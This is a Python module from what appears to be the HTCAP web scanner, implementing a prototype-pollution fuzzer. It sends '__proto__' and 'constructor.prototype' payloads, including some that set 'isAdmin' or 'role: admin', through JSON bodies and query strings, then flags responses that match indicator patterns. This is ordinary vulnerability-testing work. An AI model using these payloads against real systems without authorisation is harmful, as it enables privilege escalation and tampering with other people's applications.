# -*- coding: utf-8 -*-

"""
HTCAP - Prototype Pollution Detector
Detects JavaScript Prototype Pollution vulnerabilities.

This program is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free Software
Foundation; either version 2 of the License, or (at your option) any later
version.
"""

import json
import re
import random
import string
from typing import List, Dict, Any, Optional
from urllib.parse import urlencode, parse_qs, urlparse
from core.scan.base_fuzzer import BaseFuzzer


class PrototypePollutionFuzzer(BaseFuzzer):
    """
    Fuzzer for detecting Prototype Pollution vulnerabilities.

    Detects:
    - Server-side prototype pollution
    - JSON body pollution
    - Query parameter pollution
    - Property injection
    """

    def init(self):
        """Initialize the fuzzer."""
        self.name = "Prototype Pollution"
        self.description = "Detects Prototype Pollution vulnerabilities"

        # Prototype pollution payloads
        self.payloads = [
            # __proto__ pollution
            {"__proto__": {"polluted": "true"}},
            {"__proto__": {"isAdmin": True}},
            {"__proto__": {"admin": True}},
            {"__proto__": {"role": "admin"}},
            {"__proto__": {"status": 200}},

            # constructor.prototype pollution
            {"constructor": {"prototype": {"polluted": "true"}}},
            {"constructor": {"prototype": {"isAdmin": True}}},

            # Nested pollution
            {"__proto__": {"__proto__": {"polluted": "true"}}},

            # Array-based pollution
            {"__proto__": []},
            {"__proto__": [{"polluted": "true"}]},
        ]

        # Query string payloads
        self.qs_payloads = [
            "__proto__[polluted]=true",
            "__proto__.polluted=true",
            "__proto__[isAdmin]=true",
            "__proto__[admin]=1",
            "constructor[prototype][polluted]=true",
            "__proto__[status]=200",
            "__proto__[headers][x-]",
        ]

        # Indicators of successful pollution
        self.pollution_indicators = [
            r'"polluted"\s*:\s*"?true"?',
            r'"isAdmin"\s*:\s*true',
            r'"admin"\s*:\s*true',
            r'"role"\s*:\s*"admin"',
            r'polluted',
            r'prototype pollution',
        ]

        # Error patterns that suggest parsing of __proto__
        self.error_indicators = [
            r'__proto__',
            r'prototype',
            r'constructor',
            r'Object\.prototype',
            r'cannot\s+(set|read)\s+property',
        ]

    def _generate_canary(self, length: int = 8) -> str:
        """Generate random canary."""
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

    def _inject_pollution_payload(self, original_data: Dict, payload: Dict) -> Dict:
        """Merge pollution payload into original data."""
        result = original_data.copy() if original_data else {}
        result.update(payload)
        return result

    def _check_response_for_pollution(self, response_body: str) -> Optional[str]:
        """Check if response indicates successful pollution."""
        for pattern in self.pollution_indicators:
            if re.search(pattern, response_body, re.IGNORECASE):
                return pattern
        return None

    def _check_response_for_errors(self, response_body: str) -> Optional[str]:
        """Check for error patterns that suggest prototype parsing."""
        for pattern in self.error_indicators:
            if re.search(pattern, response_body, re.IGNORECASE):
                return pattern
        return None

    def fuzz(self, request, params) -> List[Dict[str, Any]]:
        """Execute Prototype Pollution detection."""
        vulnerabilities = []

        # Test JSON body pollution
        if request.data:
            try:
                original_data = json.loads(request.data) if isinstance(request.data, str) else request.data

                if isinstance(original_data, dict):
                    for payload in self.payloads:
                        try:
                            polluted_data = self._inject_pollution_payload(original_data, payload)
                            modified_body = json.dumps(polluted_data)

                            response = self.send_request(request, data=modified_body)

                            if response:
                                # Check for pollution indicators
                                pollution = self._check_response_for_pollution(response.body)
                                if pollution:
                                    vulnerabilities.append({
                                        'type': 'prototype_pollution_body',
                                        'description': f"Prototype Pollution detected in JSON body. "
                                                     f"Payload: {json.dumps(payload)}. "
                                                     f"Indicator found: {pollution}",
                                        'severity': 'high'
                                    })
                                    break

                                # Check for error patterns
                                error = self._check_response_for_errors(response.body)
                                if error:
                                    vulnerabilities.append({
                                        'type': 'prototype_pollution_potential',
                                        'description': f"Potential Prototype Pollution. "
                                                     f"Server processes __proto__. "
                                                     f"Error pattern: {error}",
                                        'severity': 'medium'
                                    })
                                    break

                        except Exception:
                            pass

            except json.JSONDecodeError:
                pass

        # Test query string pollution
        for qs_payload in self.qs_payloads:
            try:
                if '?' in request.url:
                    test_url = f"{request.url}&{qs_payload}"
                else:
                    test_url = f"{request.url}?{qs_payload}"

                response = self.send_request(request, modified_url=test_url)

                if response:
                    pollution = self._check_response_for_pollution(response.body)
                    if pollution:
                        vulnerabilities.append({
                            'type': 'prototype_pollution_qs',
                            'description': f"Prototype Pollution via query string. "
                                         f"Payload: {qs_payload}. "
                                         f"Indicator: {pollution}",
                            'severity': 'high'
                        })
                        break

                    error = self._check_response_for_errors(response.body)
                    if error:
                        vulnerabilities.append({
                            'type': 'prototype_pollution_qs_potential',
                            'description': f"Server parses __proto__ from query string. "
                                         f"Payload: {qs_payload}. "
                                         f"Pattern: {error}",
                            'severity': 'medium'
                        })
                        break

            except Exception:
                pass

        return vulnerabilities
